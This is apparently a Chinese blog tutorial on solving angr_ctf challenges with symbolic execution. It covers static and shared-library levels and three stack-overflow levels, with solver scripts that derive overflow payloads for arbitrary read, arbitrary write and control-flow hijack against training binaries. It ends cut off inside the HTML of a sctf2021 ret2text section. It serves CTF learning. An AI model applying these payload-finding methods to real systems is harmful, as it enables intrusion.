<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/12_angr_veritesting&#x27;</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state, veritesting=<span class="literal">True</span>)</span><br><span class="line">simgr.explore(</span><br><span class="line">    find=<span class="keyword">lambda</span> state : <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>),</span><br><span class="line">    avoid=<span class="keyword">lambda</span> state: <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p>这种写法与上面的写法是等价的：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.use_technique(angr.exploration_techniques.Veritesting())</span><br></pre></td></tr></table></figure>
<h4 id="library"><a href="#library" class="headerlink" title="library"></a>library</h4><p><strong>angr_static_binary</strong></p>
<p>angr没有成功识别静态库函数并替换，需要我们手动替换，防止angr符号执行陷进复杂的库函数里面</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/13_angr_static_binary&#x27;</span>)</span><br><span class="line"></span><br><span class="line">proj.hook_symbol(<span class="string">&#x27;printf&#x27;</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;printf&#x27;</span>]())</span><br><span class="line">proj.hook_symbol(<span class="string">&#x27;__isoc99_scanf&#x27;</span>,angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;scanf&#x27;</span>]())</span><br><span class="line">proj.hook_symbol(<span class="string">&#x27;strcmp&#x27;</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;strcmp&#x27;</span>]())</span><br><span class="line">proj.hook_symbol(<span class="string">&#x27;puts&#x27;</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;puts&#x27;</span>]())</span><br><span class="line">proj.hook_symbol(<span class="string">&#x27;__libc_start_main&#x27;</span>,angr.SIM_PROCEDURES[<span class="string">&#x27;glibc&#x27;</span>][<span class="string">&#x27;__libc_start_main&#x27;</span>]())</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(</span><br><span class="line">    find=<span class="keyword">lambda</span> state : <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>),</span><br><span class="line">    avoid=<span class="keyword">lambda</span> state: <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p><strong>angr_shared_library</strong></p>
<p>了解如何对动态链接库中单个的函数进行符号执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [esp+1Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( validate(s, <span class="number">8</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中validate函数是动态链接库lib14_angr_shared_library.so的函数：</p>
<p>我们可以直接通过call_state创建一个函数调用的初始状态：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">state = proj.factory.call_state(validate_addr, password, length)</span><br></pre></td></tr></table></figure>
<p>完整代码如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;/dist/lib14_angr_shared_library.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">validate_addr = <span class="number">0x4006D7</span></span><br><span class="line">password = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, <span class="number">8</span> * <span class="number">8</span>)</span><br><span class="line">length = claripy.BVV(<span class="number">8</span>, <span class="number">32</span>)</span><br><span class="line">state = proj.factory.call_state(validate_addr, password, length)</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x400783</span>)</span><br><span class="line">found = simgr.found[<span class="number">0</span>]</span><br><span class="line">found.solver.add(found.regs.eax == <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(found.solver.<span class="built_in">eval</span>(password, cast_to=<span class="built_in">bytes</span>))</span><br></pre></td></tr></table></figure>
<p>动态链接库都是地址无关的可执行文件（position-independent executable，PIE），若不手动指定PIE的基质，angr会将符号执行的基址指定为默认的0x400000，并输出：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WARNING | <span class="number">2021</span>-<span class="number">10</span>-07 <span class="number">00</span>:<span class="number">15</span>:<span class="number">28</span>,<span class="number">674</span> | cle.loader | The main binary <span class="keyword">is</span> a position-independent executable. It <span class="keyword">is</span> being loaded <span class="keyword">with</span> a base address of <span class="number">0x400000</span>.</span><br></pre></td></tr></table></figure>
<p>当然也可以自行指定基址，方法如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/lib14_angr_shared_library.so&#x27;</span>, load_options=&#123;</span><br><span class="line">    <span class="string">&#x27;main_opts&#x27;</span> : &#123;</span><br><span class="line">        <span class="string">&#x27;base_addr&#x27;</span> : <span class="number">0x400000</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h4 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h4><p>angr_ctf系列的最后一节，在这一节我们通过三个栈溢出的例子来学习angr在漏洞挖掘方向的简单应用。</p>
<p><strong>angr_arbitrary_read</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  s = try_again;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u %20s&quot;</span>, &amp;key, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">41810812</span> )</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(try_again);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>scanf处有一个溢出，可以通过scanf将s的地址覆盖为0x484F6038，使<code>puts(s)</code>能够打印”Good Jobs”</p>
<p>直接梭哈的话不太行，angr没有分析出这个栈溢出漏洞，原因可能是angr无法分析出”Good Job”来自哪个地址：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/15_angr_arbitrary_read&#x27;</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(</span><br><span class="line">    find=<span class="keyword">lambda</span> state : <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>),</span><br><span class="line">    avoid=<span class="keyword">lambda</span> state: <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))   </span><br></pre></td></tr></table></figure>
<p>该题是通过puts输出的，所以我们可以将判断输出中是否包含”Good Job.”的条件改为，puts的参数是否为”Good Job.”的地址，即0x484F6038。检测puts参数的代码如下，很好理解：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_puts</span>(<span class="params">state</span>):</span><br><span class="line">    puts_parameter = state.memory.load(state.regs.esp + <span class="number">4</span>, <span class="number">4</span>, endness=proj.arch.memory_endness)</span><br><span class="line">    <span class="keyword">if</span> state.solver.symbolic(puts_parameter):</span><br><span class="line">        good_job_string_address = <span class="number">0x484F6038</span></span><br><span class="line">        is_vulnerable_expression = puts_parameter == good_job_string_address</span><br><span class="line">        copied_state = state.copy()</span><br><span class="line">        copied_state.add_constraints(is_vulnerable_expression)</span><br><span class="line">        <span class="keyword">if</span> copied_state.satisfiable():</span><br><span class="line">            state.add_constraints(is_vulnerable_expression)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>explore的条件is_successful：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_successful</span>(<span class="params">state</span>):</span><br><span class="line">    puts_address = <span class="number">0x08048370</span></span><br><span class="line">    <span class="keyword">if</span> state.addr == puts_address:</span><br><span class="line">        <span class="keyword">return</span> check_puts(state)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>程序的流程并不是很复杂，所以本题的关键还是在于给explore函数找到一个合适的判定条件。在自动化Pwn中，这个条件往往要改为执行到<code>system(&quot;/bin/sh&quot;)</code>。</p>
<p>完整代码：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_puts</span>(<span class="params">state</span>):</span><br><span class="line">    puts_parameter = state.memory.load(state.regs.esp + <span class="number">4</span>, <span class="number">4</span>, endness=proj.arch.memory_endness)</span><br><span class="line">    <span class="keyword">if</span> state.solver.symbolic(puts_parameter):</span><br><span class="line">        good_job_string_address = <span class="number">0x484F6038</span></span><br><span class="line">        is_vulnerable_expression = puts_parameter == good_job_string_address</span><br><span class="line">        copied_state = state.copy()</span><br><span class="line">        copied_state.add_constraints(is_vulnerable_expression)</span><br><span class="line">        <span class="keyword">if</span> copied_state.satisfiable():</span><br><span class="line">            state.add_constraints(is_vulnerable_expression)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_successful</span>(<span class="params">state</span>):</span><br><span class="line">    puts_address = <span class="number">0x08048370</span></span><br><span class="line">    <span class="keyword">if</span> state.addr == puts_address:</span><br><span class="line">        <span class="keyword">return</span> check_puts(state)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/15_angr_arbitrary_read&#x27;</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=is_successful)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p>有一个要注意的地方是这里：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts_parameter = state.memory.load(state.regs.esp + <span class="number">4</span>, <span class="number">4</span>, endness=proj.arch.memory_endness)</span><br></pre></td></tr></table></figure>
<p>的<code>endness=proj.arch.memory_endness</code>是指定读取的方式为小端。</p>
<p><strong>angr_arbitrary_write</strong></p>
<p>这题的思路稍微比上题复杂一点，在这题中我们可以通过scanf将dest覆盖成任意地址，然后通过第二个strncpy向dest中保存的地址写入任何数据，因此我们可以向任何地址写入任何数据，这是一个任意写漏洞。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [esp+Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> *dest; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  dest = unimportant_buffer;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">strncpy</span>(password_buffer, <span class="string">&quot;PASSWORD&quot;</span>, <span class="number">0xC</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u %20s&quot;</span>, &amp;key, s);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">11604995</span> )</span><br><span class="line">    <span class="built_in">strncpy</span>(dest, s, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">strncpy</span>(unimportant_buffer, s, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(password_buffer, <span class="string">&quot;NDYNWEUJ&quot;</span>, <span class="number">8u</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先我们将dest覆盖成password_buffer的地址，然后再通过第二个strncpy往dest中写入”PASSWORD”，最后输出”Good Job.”</p>
<p>直接梭哈还是不行，原因可能是angr没有判断出password_buffer可以被覆盖为符号值。</p>
<p>还是按照上题的思路，这回我们要check的是strncpy函数，约束条件为dest指向的地址为password_buffer，并且src为”NDYNWEUJ”，代码如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_strncpy</span>(<span class="params">state</span>):</span><br><span class="line">    dest = state.memory.load(state.regs.esp + <span class="number">4</span>, <span class="number">4</span>, endness=proj.arch.memory_endness)</span><br><span class="line">    src = state.memory.load(state.regs.esp + <span class="number">8</span>, <span class="number">4</span>, endness=proj.arch.memory_endness)</span><br><span class="line">    src_content = state.memory.load(src, <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">if</span> state.solver.symbolic(src_content) <span class="keyword">and</span> state.solver.symbolic(dest):</span><br><span class="line">        is_vulnerable_expression = claripy.And(src_content == <span class="string">b&#x27;NDYNWEUJ&#x27;</span>, dest == <span class="number">0x57584344</span>)</span><br><span class="line">        copied_state = state.copy()</span><br><span class="line">        copied_state.add_constraints(is_vulnerable_expression)</span><br><span class="line">        <span class="keyword">if</span> copied_state.satisfiable():</span><br><span class="line">            state.add_constraints(is_vulnerable_expression)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_successful</span>(<span class="params">state</span>):</span><br><span class="line">    strncpy_address = <span class="number">0x08048410</span></span><br><span class="line">    <span class="keyword">if</span> state.addr == strncpy_address:</span><br><span class="line">        <span class="keyword">return</span> check_strncpy(state)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/16_angr_arbitrary_write&#x27;</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=is_successful)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p><strong>angr_arbitrary_jump</strong></p>
<p>rop</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">read_input</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">32</span>]; <span class="comment">// [esp+28h] [ebp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当一个指令有很多分支的可能性时，称之为不受约束（unconstrained）的状态， 比如说当用户的输入决定下一条指令的位置。angr 在遇到不受约束的状态时会将其抛出，本题将要关闭这个默认行为，转而利用此状态去求解能够跳转到print_good函数的payload。</p>
<p>求解步骤：</p>
<ul>
<li>初始化proj，让 angr 记录不受约束的状态</li>
<li>开始step直到发现 eip 为符号的状态</li>
<li>约束 eip 与 print_good 函数地址相同</li>
<li>约束求解</li>
</ul>
<p>完整exp：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;../dist/17_angr_arbitrary_jump&#x27;</span>)</span><br><span class="line">payload = claripy.BVS(<span class="string">&#x27;payload&#x27;</span>, <span class="number">64</span> * <span class="number">8</span>)</span><br><span class="line">state = proj.factory.entry_state(stdin=payload)</span><br><span class="line">simgr = proj.factory.simgr(</span><br><span class="line">    state, </span><br><span class="line">    save_unconstrained=<span class="literal">True</span>, </span><br><span class="line">    stashes=&#123;</span><br><span class="line">        <span class="string">&#x27;active&#x27;</span>:[state],</span><br><span class="line">        <span class="string">&#x27;unconstrained&#x27;</span>: [],</span><br><span class="line">        <span class="string">&#x27;found&#x27;</span>: [],</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">len</span>(simgr.active) <span class="keyword">or</span> <span class="built_in">len</span>(simgr.unconstrained)) <span class="keyword">and</span> <span class="keyword">not</span> <span class="built_in">len</span>(simgr.found):</span><br><span class="line">    <span class="keyword">for</span> unconstrained <span class="keyword">in</span> simgr.unconstrained:</span><br><span class="line">        eip = unconstrained.regs.eip</span><br><span class="line">        print_good_addr = <span class="number">0x42585249</span></span><br><span class="line">        <span class="keyword">if</span> unconstrained.satisfiable(extra_constraints=[eip == print_good_addr]):</span><br><span class="line">            unconstrained.add_constraints(eip == print_good_addr)</span><br><span class="line">            simgr.move(<span class="string">&#x27;unconstrained&#x27;</span>, <span class="string">&#x27;found&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    simgr.drop(stash=<span class="string">&quot;unconstrained&quot;</span>)</span><br><span class="line">    simgr.step()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p>打印unconstrained状态，可以发现其地址是由输入决定的：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>unconstrained</span><br><span class="line">&lt;SimState @ &lt;BV32 payload_0_512[<span class="number">199</span>:<span class="number">192</span>] .. payload_0_512[<span class="number">207</span>:<span class="number">200</span>] .. payload_0_512[<span class="number">215</span>:<span class="number">208</span>] .. payload_0_512[<span class="number">223</span>:<span class="number">216</span>]&gt;&gt;</span><br></pre></td></tr></table></figure>
<p>所以我们对eip进行约束求解，就能找到会导致栈溢出的payload。</p>
<h3 id="sctf2021-CheckIn-ret2text"><a href="#sctf2021-CheckIn-ret2text" class="headerlink" title="sctf2021-CheckIn_ret2text"></a>sctf2021-CheckIn_ret2text</h3><p>因为是复现,所以直接看源码</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span 